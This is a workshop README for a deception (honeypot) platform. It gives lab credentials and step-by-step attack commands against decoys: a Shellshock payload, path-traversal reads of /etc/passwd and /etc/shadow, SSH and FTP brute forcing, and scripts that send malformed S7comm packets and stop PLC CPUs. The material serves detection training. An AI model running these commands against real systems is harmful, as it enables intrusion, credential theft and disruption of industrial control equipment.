# Welcome to the Labyrinth Deception Platform workshop
All you may need for the workshop is available in this repository.
## Getting access
Our lab setup looks this way:

Please navigate to our demo stand:
1. **Credentials to the AdminVM**

You may use any web browser of your choice.
```
URL: https://demo.labyrinth.tech/
Username: user
Password: 2~8uH'14leki
```
> [!NOTE]
> Feel free to create your own users here by going to the Settings->Users.

2. **Credentials to the attacking host**

From this host you will perform your attacks. Please use SSH and following credentials:
```
Host: warrior.labyrinth.tech
Username: user
Password: K4H*91kYg/j*
```

## Terminology that will be used today
Due to the fact that today we are using Labyrinth Deception Platform as the example of the deception platfroms, it has its own terminology that will be actively used today:
1. **Point** = network decoy, lure, deceptive network services.
> [!NOTE]
> Points ARE NOT separate virtual machines.
2. **Honeynet** = network segment in which Points operate. Used to specify in which VLAN you would like to run your Points.
3. **Seeder Tasks** = file decoys, breadcrumbs used to logically link real and deceptive infrastructure.
4. **Seeder Agent** = binary that spreads Seeder Tasks on real hosts.
5. **Admin VM (Management Console)**  = main module that controls the system.
6. **Worker VM** = node on which Points are running.

## Commands transcript
In addition, we provide the transcript of all commands for your ease of use. Even if you missed any part of the presentation, feel free to use those notes to continue exploring.

> [!IMPORTANT]
> **\<any data>** indicates that you should paste in your own data that is entioned inside the triangular brackets.
>
> **[options]** indicates that this part (or parts) of the command is optional and can be omitted. Multiple options are listed using / (slash).

#### Case 1: network scan detection
Several tools can be used. For example, [nmap](https://nmap.org/):
```
nmap [-sS/sT/sW/sM/sU/sF/sX] ​<Point IP>
```

#### Case 2: deception using breadcrumbs
1. Navigate to the Seeder Agents -> Tasks
2. Choose ssh_txt_credentials or ssh_config from the list
3. Click on three dots, and then Details
4. Use those credentials to login:
```
ssh <user>@<Point IP>
```

#### Case 3: web deception using UWP
UWP stands for Universal Web Point. It is a decoy type, developed by the Labyrinth Security Solutions team, that allows to emulate anything that has a web interface just in seconds.

In this case we will be trying to exploit [Shellshock](https://blog.cloudflare.com/inside-shellshock).
```
curl -k -H "User-Agent: () { :; }; /bin/bash cat /etc/passwd" http://<UWP IP>/
```
#### Case 4: interaction with MQTT broker
Subscribe to all topics:
```
mosquitto_sub -h <MQTT broker IP> -t "#" [-u <username> -P <password>]
```
Publish a topic:
```
mosquitto_pub -h <Point IP> -t <topic name> [-u <username> -P <password>] -m 'My Message'
```

#### Case 5: S7comm malformed PDU
For this case there is a [script](https://github.com/ad-labyrinth/ATS2023/blob/main/scripts/S7_Malformed_PDU.py) that is also available on your VM:
```
cd scripts
```
Simply run it: 
```
python3 S7_malformed_PDU.py -a <Point IP>
```
Or:
```
python3 S7_malformed_PDU.py --plc_ip_addr <Point IP>
```
More about S7comm packet structure: [The Siemens S7 Communication - Part 1 General Structure](http://gmiru.com/article/s7comm/) and [The Siemens S7 Communication - Part 2 Job Requests and Ack Data](http://gmiru.com/article/s7comm-part2/)

#### [Advanced] Case 6: gathering info from web server

1. Find web server
```
sudo nmap -sS -sC -p80,443 <Honeynet subnet> -vvv 
```
Also search for an SSH host: 
```
sudo nmap -sS -sC -p22 <Honeynet subnet> -vvv 
```
2. Perform LFI
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```
or
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow 
```

Bonus step: search for additional web path:
```
dirsearch --wordlists=/home/user/wordlists/directories.txt -u https://<Point IP>/ 
```

Reference: [dirsearch](https://github.com/maurosoria/dirsearch)

3. Setup the wordlist
```
cd wordlists
nano brute.dict
```
4. Perfrom SSH bruteforce
```
hydra -L brute.dict -P passwords.dict <IP of the ssh host> ssh -t 4 
```
5. Login to the host
```
ssh <user>@<Point IP>
```
Bonus step: reuse credentials to connect to another host
```
ssh <user>@warrior.labyrinth.tech
```

#### [Advanced] Case 7: attacking industrial networks
1. Search network for FTP server
```
sudo nmap -sS -sC -p21 -T4 <Honeynet subnet> -vvv 
```
2. Connect to the FTP

Try to connect anonymously:
```
ftp <FTP IP address>
```
Start FTP bruteforce:
```
cd wordlists
nmap --script ftp-brute -p21 <FTP IP address> --script-args userdb=users.dict,passdb=passwords.dict
```
3. Inspect found file
```
ls -la
file <file>
less <file>
```
4. Perform S7comm CPU control request
```
cd S7_scripts
python2 s7300stop.py <S7-300 IP address>
```
In addition, you can try to start CPU start message:
```
python2 s7300cpustart.py <S7-300 IP address>
```
Reference: [exploits source](https://github.com/hackerhouse-opensource/exploits)

## About Labyrinth Deception Platform
Labyrinth is a team of experienced cybersecurity engineers and penetration testers, which specializes in the development of solutions for early cyber threat detection and prevention.

Deception techniques provide adversaries with an essential advantage over defenders, who cannot predict attackers’ next move. **OUR VISION** is to shift the balance of power in favor of defenders.

**OUR MISSION** is to provide all kinds of organizations with a simple and efficient tool for the earliest possible detection of attackers inside the corporate network.

More information about the platform: https://labyrinth.tech/ 
